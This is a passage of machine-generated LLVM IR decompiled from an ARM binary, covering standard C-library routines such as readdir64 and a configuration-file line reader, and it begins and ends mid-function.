dec_label_pc_17fa4:                               ; preds = %dec_label_pc_17f84
  %v0_17fa4 = load i32, i32* @r4, align 4
  %v2_17fac = call i32 @fd_to_DIR(i32 %v0_17fa4, i32 %tmp)
  store i32 %v2_17fac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17fbc

dec_label_pc_17fb8:                               ; preds = %entry, %dec_label_pc_17f70
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17fbc

dec_label_pc_17fbc:                               ; preds = %dec_label_pc_17fa4, %dec_label_pc_17f9c, %dec_label_pc_17fb8
  %v0_17fbc = phi i32 [ %v2_17fac, %dec_label_pc_17fa4 ], [ %v0_17fbc.pre, %dec_label_pc_17f9c ], [ 0, %dec_label_pc_17fb8 ]
  ret i32 %v0_17fbc

; uselistorder directives
  uselistorder i32 %v2_17f78, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 6, 0, 5, 10, 9, 8, 7, 4, 3, 2, 1 }
  uselistorder i32 16384, { 12, 0, 13, 5, 6, 7, 3, 4, 1, 2, 8, 9, 10, 11 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_17fbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17fb8, { 1, 0 }
  uselistorder label %dec_label_pc_17f9c, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  %v1_17fe0 = add i32 %tmp, 24
  store i32 %v1_17fe0, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_17ff8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  store i32 %v4_17ff8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17ff8)
  %v0_1800c = load i32, i32* @r6, align 4
  %v2_1800c = add i32 %v0_1800c, 20
  %v3_1800c = inttoptr i32 %v2_1800c to i32*
  %v4_1800c = load i32, i32* %v3_1800c, align 4
  store i32 %v4_1800c, i32* %ip.global-to-local, align 4
  store i32 98328, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1800c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1801c

dec_label_pc_1801c:                               ; preds = %dec_label_pc_1804c, %entry
  %v0_1801c = load i32, i32* @r5, align 4
  %v1_1801c = add i32 %v0_1801c, 4
  %v2_1801c = inttoptr i32 %v1_1801c to i32*
  %v3_1801c = load i32, i32* %v2_1801c, align 4
  %v4_1801c = add i32 %v0_1801c, 8
  %v5_1801c = inttoptr i32 %v4_1801c to i32*
  %v6_1801c = load i32, i32* %v5_1801c, align 4
  %tmp10 = icmp ugt i32 %v6_1801c, %v3_1801c
  br i1 %tmp10, label %dec_label_pc_1804c, label %dec_label_pc_18028

dec_label_pc_18028:                               ; preds = %dec_label_pc_1801c
  %v1_18028 = inttoptr i32 %v0_1801c to i32*
  %v2_18028 = load i32, i32* %v1_18028, align 4
  %v1_1802c = add i32 %v0_1801c, 12
  %v2_1802c = inttoptr i32 %v1_1802c to i32*
  %v3_1802c = load i32, i32* %v2_1802c, align 4
  %v1_18030 = add i32 %v0_1801c, 20
  %v2_18030 = inttoptr i32 %v1_18030 to i32*
  %v3_18030 = load i32, i32* %v2_18030, align 4
  %v4_18034 = inttoptr i32 %v3_1802c to i32*
  %v5_18034 = call i32 @__getdents64(i32 %v2_18028, i32* %v4_18034, i32 %v3_18030, i32 %v6_1801c)
  %tmp9 = icmp slt i32 %v5_18034, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_18044

.thread:                                          ; preds = %dec_label_pc_18028
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1807c

dec_label_pc_18044:                               ; preds = %dec_label_pc_18028
  %v1_18044 = load i32, i32* @r5, align 4
  %v2_18044 = add i32 %v1_18044, 8
  %v3_18044 = inttoptr i32 %v2_18044 to i32*
  store i32 %v5_18034, i32* %v3_18044, align 4
  %v0_18048 = load i32, i32* @r7, align 4
  %v1_18048 = load i32, i32* @r5, align 4
  %v2_18048 = add i32 %v1_18048, 4
  %v3_18048 = inttoptr i32 %v2_18048 to i32*
  store i32 %v0_18048, i32* %v3_18048, align 4
  %v0_1804c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1804c

dec_label_pc_1804c:                               ; preds = %dec_label_pc_1801c, %dec_label_pc_18044
  %v1_18070 = phi i32 [ %v0_1801c, %dec_label_pc_1801c ], [ %v0_1804c.pre, %dec_label_pc_18044 ]
  %v1_1804c = add i32 %v1_18070, 4
  %v2_1804c = inttoptr i32 %v1_1804c to i32*
  %v3_1804c = load i32, i32* %v2_1804c, align 4
  %v1_18050 = add i32 %v1_18070, 12
  %v2_18050 = inttoptr i32 %v1_18050 to i32*
  %v3_18050 = load i32, i32* %v2_18050, align 4
  %v2_18054 = add i32 %v3_18050, %v3_1804c
  store i32 %v2_18054, i32* @r4, align 4
  %v3_18058 = inttoptr i32 %v2_18054 to i32*
  %v4_18058 = load i32, i32* %v3_18058, align 4
  %v1_1805c = add i32 %v2_18054, 4
  %v2_1805c = inttoptr i32 %v1_1805c to i32*
  %v3_1805c = load i32, i32* %v2_1805c, align 4
  %v1_18060 = add i32 %v2_18054, 16
  %v2_18060 = inttoptr i32 %v1_18060 to i16*
  %v3_18060 = load i16, i16* %v2_18060, align 2
  %v4_18060 = zext i16 %v3_18060 to i32
  %v1_18064 = add i32 %v2_18054, 8
  %v2_18064 = inttoptr i32 %v1_18064 to i32*
  %v3_18064 = load i32, i32* %v2_18064, align 4
  store i32 %v3_18064, i32* %ip.global-to-local, align 4
  %v2_18068 = add i32 %v4_18060, %v3_1804c
  %v2_1806c = or i32 %v3_1805c, %v4_18058
  %v4_1806c = icmp eq i32 %v2_1806c, 0
  store i32 %v2_18068, i32* %v2_1804c, align 4
  %v0_18074 = load i32, i32* %ip.global-to-local, align 4
  %v1_18074 = load i32, i32* @r5, align 4
  %v2_18074 = add i32 %v1_18074, 16
  %v3_18074 = inttoptr i32 %v2_18074 to i32*
  store i32 %v0_18074, i32* %v3_18074, align 4
  br i1 %v4_1806c, label %dec_label_pc_1801c, label %dec_label_pc_1807c

dec_label_pc_1807c:                               ; preds = %dec_label_pc_1804c, %.thread
  %v0_18088 = load i32, i32* @r6, align 4
  %v2_18088 = add i32 %v0_18088, 28
  %v3_18088 = inttoptr i32 %v2_18088 to i32*
  %v4_18088 = load i32, i32* %v3_18088, align 4
  store i32 %v4_18088, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18088)
  %v0_18094 = load i32, i32* @r4, align 4
  ret i32 %v0_18094

; uselistorder directives
  uselistorder i32 %v2_18054, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_18070, { 1, 0 }
  uselistorder i32 %v6_1801c, { 1, 0 }
  uselistorder i32 %v0_1801c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1804c, { 1, 0 }
}

define i32 @function_180a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_180a8:
  %v0_180a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_180a8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_180a8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_180a8, %bb
  %v10_180b4 = phi i32 [ %arg1, %dec_label_pc_180a8 ], [ 0, %bb ]
  ret i32 %v10_180b4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26516)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_180d4 = load i32, i32* @r4, align 4
  %v6_180d4 = load i32, i32* @r5, align 4
  %v9_180d4 = load i32, i32* @r6, align 4
  %v12_180d4 = load i32, i32* @r7, align 4
  %v15_180d4 = load i32, i32* @r8, align 4
  %v18_180d4 = load i32, i32* @sb, align 4
  %v21_180d4 = load i32, i32* @sl, align 4
  %v24_180d4 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_180d8 = icmp eq i32* %arg1, null
  store i1 %v2_180d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_180d8, label %dec_label_pc_183e8, label %dec_label_pc_180f0

dec_label_pc_180f0:                               ; preds = %entry
  %v1_180f0 = urem i32 %arg3, 256
  store i32 %v1_180f0, i32* @sb, align 4
  %v1_180f4 = udiv i32 %arg3, 256
  %v3_180f8 = urem i32 %v1_180f4, 256
  %v3_180fc = mul nuw nsw i32 %v1_180f0, 4
  %v1_18104 = or i32 %v3_180fc, 1
  %v1_18110 = and i32 %arg3, 131072
  %v1_18114 = add nsw i32 %v1_180f0, -1
  %v1_18120 = and i32 %arg3, 262144
  store i32 %v1_18120, i32* %r2.global-to-local, align 4
  %v1_18124 = and i32 %arg3, 65536
  store i32 %v1_18124, i32* %r3.global-to-local, align 4
  store i32 %v1_18124, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_18134 = add i32 %arg4, 1
  store i32 %v1_18134, i32* @sl, align 4
  %v2_182b4 = inttoptr i32 %arg2 to i32*
  %v2_182c4 = icmp eq i32 %v1_18110, 0
  %v2_1831c = icmp eq i32 %v1_18120, 0
  br label %dec_label_pc_18138

dec_label_pc_18138:                               ; preds = %dec_label_pc_18138.backedge, %dec_label_pc_180f0
  %v2_18154 = phi i32 [ %v0_18138.pre, %dec_label_pc_18138.backedge ], [ %tmp, %dec_label_pc_180f0 ]
  %v1_18138 = add i32 %v2_18154, 4
  %v2_18138 = inttoptr i32 %v1_18138 to i32*
  %v3_18138 = load i32, i32* %v2_18138, align 4
  store i32 %v3_18138, i32* %r3.global-to-local, align 4
  %v2_1813c = icmp eq i32 %v3_18138, 0
  store i1 %v2_1813c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1813c, label %dec_label_pc_18144, label %dec_label_pc_1818c

dec_label_pc_18144:                               ; preds = %dec_label_pc_18138
  %v1_18144 = add i32 %v2_18154, 16
  %v2_18144 = inttoptr i32 %v1_18144 to i32*
  %v3_18144 = load i32, i32* %v2_18144, align 4
  store i32 %v3_18144, i32* %r3.global-to-local, align 4
  %v2_18148 = icmp eq i32 %v3_18144, 0
  store i1 %v2_18148, i1* %cpsr_z.global-to-local, align 1
  %v1_1814c = add i32 %v2_18154, 8
  %v2_1814c = inttoptr i32 %v1_1814c to i32*
  %v3_1814c = load i32, i32* %v2_1814c, align 4
  store i32 %v3_1814c, i32* %r3.global-to-local, align 4
  br i1 %v2_18148, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_18144
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_18144, align 4
  %v0_18158.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_18144, %bb
  %v0_18158 = phi i32 [ %v0_18158.pre, %bb ], [ %v3_1814c, %dec_label_pc_18144 ]
  %v2_18158 = icmp eq i32 %v0_18158, 0
  store i1 %v2_18158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18158, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_18104, i32* %r3.global-to-local, align 4
  %v2_18160 = load i32, i32* @r5, align 4
  %v3_18160 = add i32 %v2_18160, 8
  %v4_18160 = inttoptr i32 %v3_18160 to i32*
  store i32 %v1_18104, i32* %v4_18160, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_18164 = load i32, i32* @r5, align 4
  %v1_18164 = add i32 %v0_18164, 16
  %v2_18164 = inttoptr i32 %v1_18164 to i32*
  %v3_18164 = load i32, i32* %v2_18164, align 4
  store i32 %v3_18164, i32* %r0.global-to-local, align 4
  %v1_18168 = add i32 %v0_18164, 8
  %v2_18168 = inttoptr i32 %v1_18168 to i32*
  %v3_18168 = load i32, i32* %v2_18168, align 4
  store i32 %v3_18168, i32* %r3.global-to-local, align 4
  %v2_1816c = add i32 %v3_18168, %v3_18164
  store i32 %v2_1816c, i32* %r0.global-to-local, align 4
  %v1_18170 = call i32 @malloc(i32 %v2_1816c)
  store i32 %v1_18170, i32* %r0.global-to-local, align 4
  %v2_18174 = icmp eq i32 %v1_18170, 0
  store i1 %v2_18174, i1* %cpsr_z.global-to-local, align 1
  %v1_18178 = load i32, i32* @r5, align 4
  %v2_18178 = add i32 %v1_18178, 4
  %v3_18178 = inttoptr i32 %v2_18178 to i32*
  store i32 %v1_18170, i32* %v3_18178, align 4
  br i1 %v2_18174, label %dec_label_pc_183e8, label %dec_label_pc_18180

dec_label_pc_18180:                               ; preds = %.thread
  %v0_18180 = load i32, i32* @r5, align 4
  %v1_18180 = add i32 %v0_18180, 20
  %v2_18180 = inttoptr i32 %v1_18180 to i32*
  %v3_18180 = load i32, i32* %v2_18180, align 4
  %v1_18184 = or i32 %v3_18180, 1
  store i32 %v1_18184, i32* %r3.global-to-local, align 4
  store i32 %v1_18184, i32* %v2_18180, align 4
  %v0_1818c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1818c

dec_label_pc_1818c:                               ; preds = %dec_label_pc_18138, %dec_label_pc_18180
  %v1_18194 = phi i32 [ %v2_18154, %dec_label_pc_18138 ], [ %v0_1818c.pre, %dec_label_pc_18180 ]
  %v1_1818c = add i32 %v1_18194, 4
  %v2_1818c = inttoptr i32 %v1_1818c to i32*
  %v3_1818c = load i32, i32* %v2_1818c, align 4
  store i32 %v3_1818c, i32* %r2.global-to-local, align 4
  %v4_1818c = add i32 %v1_18194, 8
  %v5_1818c = inttoptr i32 %v4_1818c to i32*
  %v6_1818c = load i32, i32* %v5_1818c, align 4
  %v2_18190 = add i32 %v6_1818c, %v3_1818c
  store i32 %v2_18190, i32* %r3.global-to-local, align 4
  %v2_18194 = add i32 %v1_18194, 12
  %v3_18194 = inttoptr i32 %v2_18194 to i32*
  store i32 %v2_18190, i32* %v3_18194, align 4
  %v0_18198 = load i32, i32* @fp, align 4
  store i32 %v0_18198, i32* @r6, align 4
  br label %dec_label_pc_1819c

dec_label_pc_1819c:                               ; preds = %dec_label_pc_18228, %dec_label_pc_18214, %dec_label_pc_1818c
  %v0_181a4 = phi i32 [ %v0_18198, %dec_label_pc_1818c ], [ %v1_18214, %dec_label_pc_18214 ], [ %v0_181a4.pre.pre, %dec_label_pc_18228 ]
  %v0_1819c = load i32, i32* @r5, align 4
  %v1_1819c = add i32 %v0_1819c, 12
  store i32 %v1_1819c, i32* %r0.global-to-local, align 4
  %v1_181a0 = inttoptr i32 %v1_1819c to i32*
  %v2_181a0 = load i32, i32* %v1_181a0, align 4
  store i32 %v2_181a0, i32* %r0.global-to-local, align 4
  %v3_181a0 = add i32 %v0_1819c, 16
  %v4_181a0 = inttoptr i32 %v3_181a0 to i32*
  %v5_181a0 = load i32, i32* %v4_181a0, align 4
  %v2_181a4 = add i32 %v2_181a0, %v0_181a4
  store i32 %v2_181a4, i32* %r0.global-to-local, align 4
  %v2_181a8 = sub i32 %v5_181a0, %v0_181a4
  %v1_181ac = inttoptr i32 %v0_1819c to i32*
  %v2_181ac = load i32, i32* %v1_181ac, align 4
  store i32 %v2_181ac, i32* %r2.global-to-local, align 4
  %v3_181b0 = call i32 @fgets(i32 %v2_181a4, i32 %v2_181a8, i32 %v2_181ac)
  store i32 %v3_181b0, i32* %r0.global-to-local, align 4
  store i32 %v3_181b0, i32* %r4.global-to-local, align 4
  %v2_181b4 = icmp eq i32 %v3_181b0, 0
  store i1 %v2_181b4, i1* %cpsr_z.global-to-local, align 1
  %v0_181bc = load i32, i32* @r5, align 4
  %v1_181bc = add i32 %v0_181bc, 12
  br i1 %v2_181b4, label %dec_label_pc_181bc, label %dec_label_pc_181d4

dec_label_pc_181bc:                               ; preds = %dec_label_pc_1819c
  store i32 %v1_181bc, i32* %r0.global-to-local, align 4
  %v1_181c0 = inttoptr i32 %v1_181bc to i32*
  %v2_181c0 = load i32, i32* %v1_181c0, align 4
  store i32 %v2_181c0, i32* %r0.global-to-local, align 4
  %v3_181c0 = add i32 %v0_181bc, 16
  %v4_181c0 = inttoptr i32 %v3_181c0 to i32*
  %v5_181c0 = load i32, i32* %v4_181c0, align 4
  store i32 %v5_181c0, i32* @r2, align 4
  %v2_181c8 = inttoptr i32 %v2_181c0 to i8*
  %v3_181c8 = call i32 @__GI_memset(i8* %v2_181c8, i32 0)
  store i32 %v3_181c8, i32* %r0.global-to-local, align 4
  %v0_181cc = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_183ec

dec_label_pc_181d4:                               ; preds = %dec_label_pc_1819c
  %v2_181d4 = inttoptr i32 %v1_181bc to i32*
  %v3_181d4 = load i32, i32* %v2_181d4, align 4
  store i32 %v3_181d4, i32* @r4, align 4
  %v1_181d8 = load i32, i32* @r6, align 4
  %v2_181d8 = add i32 %v1_181d8, %v3_181d4
  %v3_181d8 = inttoptr i32 %v2_181d8 to i8*
  store i32 %v2_181d8, i32* %r0.global-to-local, align 4
  %v3_181dc = call i32 @strlen(i8* %v3_181d8)
  %v0_181e4 = load i32, i32* @r6, align 4
  %v2_181e4 = add i32 %v0_181e4, %v3_181dc
  store i32 %v2_181e4, i32* @r6, align 4
  %v0_181e8 = load i32, i32* @r4, align 4
  store i32 %v0_181e8, i32* @r0, align 4
  %v2_181ec = call i32 @__GI_strchr(i32 %v0_181e8, i32 10)
  store i32 %v2_181ec, i32* %r0.global-to-local, align 4
  %v2_181f0 = icmp eq i32 %v2_181ec, 0
  store i1 %v2_181f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181f0, label %dec_label_pc_1821c, label %dec_label_pc_181f8

dec_label_pc_181f8:                               ; preds = %dec_label_pc_181d4
  %v1_181f8 = inttoptr i32 %v2_181ec to i8*
  %v2_181f8 = load i8, i8* %v1_181f8, align 1
  %v3_181f8 = zext i8 %v2_181f8 to i32
  %v1_181fc = add nuw nsw i32 %v3_181f8, 255
  %v1_18200 = urem i32 %v1_181fc, 256
  store i32 %v1_18200, i32* %r3.global-to-local, align 4
  %v7_18204 = icmp eq i32 %v1_18200, 92
  store i1 %v7_18204, i1* %cpsr_z.global-to-local, align 1
  %v1_18208 = trunc i32 %v1_181fc to i8
  store i8 %v1_18208, i8* %v1_181f8, align 1
  %v0_1820c = load i32, i32* @r6, align 4
  %v1_1820c = add i32 %v0_1820c, -1
  store i32 %v1_1820c, i32* @r6, align 4
  %v0_18210 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18210, label %dec_label_pc_18214, label %dec_label_pc_182a0

dec_label_pc_18214:                               ; preds = %dec_label_pc_181f8
  %v1_18214 = add i32 %v0_1820c, -2
  store i32 %v1_18214, i32* @r6, align 4
  br label %dec_label_pc_1819c

dec_label_pc_1821c:                               ; preds = %dec_label_pc_181d4
  %v0_1821c = load i32, i32* @r5, align 4
  %v1_1821c = add i32 %v0_1821c, 20
  %v2_1821c = inttoptr i32 %v1_1821c to i32*
  %v3_1821c = load i32, i32* %v2_1821c, align 4
  store i32 %v3_1821c, i32* %r3.global-to-local, align 4
  %v2_18220 = icmp eq i32 %v3_1821c, 0
  store i1 %v2_18220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18220, label %dec_label_pc_18258, label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_1821c
  %v1_18228 = add i32 %v0_1821c, 16
  %v2_18228 = inttoptr i32 %v1_18228 to i32*
  %v3_18228 = load i32, i32* %v2_18228, align 4
  store i32 %v3_18228, i32* %r3.global-to-local, align 4
  %v1_1822c = add i32 %v0_1821c, 8
  %v2_1822c = inttoptr i32 %v1_1822c to i32*
  %v3_1822c = load i32, i32* %v2_1822c, align 4
  %v1_18230 = add i32 %v3_18228, 4096
  store i32 %v1_18230, i32* %r3.global-to-local, align 4
  %v2_18234 = add i32 %v3_1822c, %v1_18230
  store i32 %v1_18230, i32* %v2_18228, align 4
  %v0_1823c = load i32, i32* @r5, align 4
  %v1_1823c = add i32 %v0_1823c, 4
  %v2_1823c = inttoptr i32 %v1_1823c to i32*
  %v3_1823c = load i32, i32* %v2_1823c, align 4
  store i32 %v3_1823c, i32* %r0.global-to-local, align 4
  %v2_18240 = inttoptr i32 %v3_1823c to i32*
  %v3_18240 = call i32 @realloc(i32* %v2_18240, i32 %v2_18234)
  store i32 %v3_18240, i32* %r0.global-to-local, align 4
  %v0_18244 = load i32, i32* @r5, align 4
  %v1_18244 = add i32 %v0_18244, 8
  %v2_18244 = inttoptr i32 %v1_18244 to i32*
  %v3_18244 = load i32, i32* %v2_18244, align 4
  %v2_18248 = add i32 %v3_18244, %v3_18240
  store i32 %v2_18248, i32* %r3.global-to-local, align 4
  %v2_1824c = add i32 %v0_18244, 12
  %v3_1824c = inttoptr i32 %v2_1824c to i32*
  store i32 %v2_18248, i32* %v3_1824c, align 4
  %v1_18250 = load i32, i32* @r5, align 4
  %v2_18250 = add i32 %v1_18250, 4
  %v3_18250 = inttoptr i32 %v2_18250 to i32*
  store i32 %v3_18240, i32* %v3_18250, align 4
  %v0_181a4.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1819c

dec_label_pc_18258:                               ; preds = %dec_label_pc_1821c, %.dec_label_pc_18258_crit_edge
  %v0_18258 = phi i32 [ %v0_18258.pre, %.dec_label_pc_18258_crit_edge ], [ %v0_1821c, %dec_label_pc_1821c ]
  %v1_18258 = inttoptr i32 %v0_18258 to i32*
  %v2_18258 = load i32, i32* %v1_18258, align 4
  %v1_1825c = add i32 %v2_18258, 52
  %v2_1825c = inttoptr i32 %v1_1825c to i32*
  %v3_1825c = load i32, i32* %v2_1825c, align 4
  store i32 %v3_1825c, i32* %r3.global-to-local, align 4
  %v2_18260 = icmp eq i32 %v3_1825c, 0
  store i1 %v2_18260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18260, label %dec_label_pc_1828c, label %dec_label_pc_18268

dec_label_pc_18268:                               ; preds = %dec_label_pc_18258
  %v1_18268 = add i32 %v2_18258, 16
  %v2_18268 = inttoptr i32 %v1_18268 to i32*
  %v3_18268 = load i32, i32* %v2_18268, align 4
  store i32 %v3_18268, i32* %r2.global-to-local, align 4
  %v1_1826c = add i32 %v2_18258, 24
  %v2_1826c = inttoptr i32 %v1_1826c to i32*
  %v3_1826c = load i32, i32* %v2_1826c, align 4
  store i32 %v3_1826c, i32* %r3.global-to-local, align 4
  %v3_18270 = icmp ult i32 %v3_18268, %v3_1826c
  %v9_18270 = icmp eq i32 %v3_18268, %v3_1826c
  store i1 %v9_18270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18270, label %dec_label_pc_18294thread-pre-split, label %dec_label_pc_18280

dec_label_pc_18280:                               ; preds = %dec_label_pc_18268
  store i32 %v2_18258, i32* %r0.global-to-local, align 4
  %v1_18284 = inttoptr i32 %v2_18258 to i16*
  %v2_18284 = call i32 @getc_unlocked(i16* %v1_18284)
  store i32 %v2_18284, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18294

dec_label_pc_1828c:                               ; preds = %dec_label_pc_18258
  store i32 %v2_18258, i32* %r0.global-to-local, align 4
  %v1_18290 = call i32 @__GI_fgetc(i32 %v2_18258)
  store i32 %v1_18290, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18294

dec_label_pc_18294thread-pre-split:               ; preds = %dec_label_pc_18268
  %v2_18274 = inttoptr i32 %v3_18268 to i8*
  %v3_18274 = load i8, i8* %v2_18274, align 1
  %v4_18274 = zext i8 %v3_18274 to i32
  store i32 %v4_18274, i32* %r0.global-to-local, align 4
  %v6_18274 = add i32 %v3_18268, 1
  store i32 %v6_18274, i32* %r2.global-to-local, align 4
  store i32 %v6_18274, i32* %v2_18268, align 4
  %v0_18294.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %dec_label_pc_18294thread-pre-split, %dec_label_pc_18280, %dec_label_pc_1828c
  %v1_18298 = phi i32 [ %v0_18294.pr, %dec_label_pc_18294thread-pre-split ], [ %v2_18284, %dec_label_pc_18280 ], [ %v1_18290, %dec_label_pc_1828c ]
  %v7_18294 = icmp eq i32 %v1_18298, 10
  store i1 %v7_18294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18294, label %dec_label_pc_182a0.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_18294
  %v8_18298 = icmp eq i32 %v1_18298, -1
  store i1 %v8_18298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18298, label %dec_label_pc_182a0.loopexit, label %.dec_label_pc_18258_crit_edge

.dec_label_pc_18258_crit_edge:                    ; preds = %bb68
  %v0_18258.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18258

dec_label_pc_182a0.loopexit:                      ; preds = %bb68, %dec_label_pc_18294
  %v0_182a0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_182a0

dec_label_pc_182a0:                               ; preds = %dec_label_pc_181f8, %dec_label_pc_182a0.loopexit
  %v0_182a0 = phi i32 [ %v0_182a0.pre, %dec_label_pc_182a0.loopexit ], [ %v1_1820c, %dec_label_pc_181f8 ]
  %v7_182a0 = icmp eq i32 %v0_182a0, -1
  store i1 %v7_182a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_182a0, label %dec_label_pc_183e8, label %dec_label_pc_182a8

dec_label_pc_182a8:                               ; preds = %dec_label_pc_182a0
  %v0_182a8 = load i32, i32* @r5, align 4
  %v1_182a8 = add i32 %v0_182a8, 4
  %v2_182a8 = inttoptr i32 %v1_182a8 to i32*
  %v3_182a8 = load i32, i32* %v2_182a8, align 4
  store i32 %v3_182a8, i32* %r0.global-to-local, align 4
  store i32 %v3_180fc, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_182a8, i32* %v2_182b4, align 4
  %v0_182b8 = load i32, i32* @fp, align 4
  %v2_182bc = inttoptr i32 %v3_182a8 to i8*
  %v3_182bc = call i32 @__GI_memset(i8* %v2_182bc, i32 %v0_182b8)
  store i32 %v3_182bc, i32* %r0.global-to-local, align 4
  store i32 %v1_18110, i32* %r2.global-to-local, align 4
  store i1 %v2_182c4, i1* %cpsr_z.global-to-local, align 1
  %v0_182c8 = load i32, i32* @r5, align 4
  %v1_182c8 = add i32 %v0_182c8, 12
  %v2_182c8 = inttoptr i32 %v1_182c8 to i32*
  %v3_182c8 = load i32, i32* %v2_182c8, align 4
  store i32 %v3_182c8, i32* @r4, align 4
  br i1 %v2_182c4, label %dec_label_pc_182e0, label %dec_label_pc_182d0

dec_label_pc_182d0:                               ; preds = %dec_label_pc_182a8
  store i32 %v3_182c8, i32* @r0, align 4
  %v1_182d8 = inttoptr i32 %v3_182c8 to i8*
  %v2_182d8 = call i32 @__GI_strspn(i8* %v1_182d8)
  store i32 %v2_182d8, i32* %r0.global-to-local, align 4
  %v0_182dc = load i32, i32* @r4, align 4
  %v2_182dc = add i32 %v0_182dc, %v2_182d8
  store i32 %v2_182dc, i32* @r4, align 4
  br label %dec_label_pc_182e0

dec_label_pc_182e0:                               ; preds = %dec_label_pc_182a8, %dec_label_pc_182d0
  %v0_183b813 = phi i32 [ %v3_182c8, %dec_label_pc_182a8 ], [ %v2_182dc, %dec_label_pc_182d0 ]
  %v1_182e0 = inttoptr i32 %v0_183b813 to i8*
  %v2_182e0 = load i8, i8* %v1_182e0, align 1
  %v3_182e0 = zext i8 %v2_182e0 to i32
  store i32 %v3_182e0, i32* %r2.global-to-local, align 4
  %v2_182e4 = icmp eq i8 %v2_182e0, 0
  store i1 %v2_182e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182e4, label %dec_label_pc_18138.backedge, label %dec_label_pc_182ec

dec_label_pc_18138.backedge:                      ; preds = %dec_label_pc_182e0, %dec_label_pc_183e0, %dec_label_pc_182ec
  %v0_18138.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18138

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182e0
  %v0_182ec = load i32, i32* @r7, align 4
  %v1_182ec = inttoptr i32 %v0_182ec to i8*
  %v2_182ec = load i8, i8* %v1_182ec, align 1
  %v3_182ec = zext i8 %v2_182ec to i32
  store i32 %v3_182ec, i32* %r3.global-to-local, align 4
  %v9_182f0 = icmp eq i8 %v2_182ec, %v2_182e0
  store i1 %v9_182f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_182f0, label %dec_label_pc_18138.backedge, label %dec_label_pc_183b8.preheader

dec_label_pc_183b8.preheader:                     ; preds = %dec_label_pc_182ec
  %v1_182f4 = load i32, i32* @fp, align 4
  store i32 %v1_182f4, i32* @r6, align 4
  %v2_183b815 = load i8, i8* %v1_182e0, align 1
  %v3_183b816 = zext i8 %v2_183b815 to i32
  store i32 %v3_183b816, i32* %r2.global-to-local, align 4
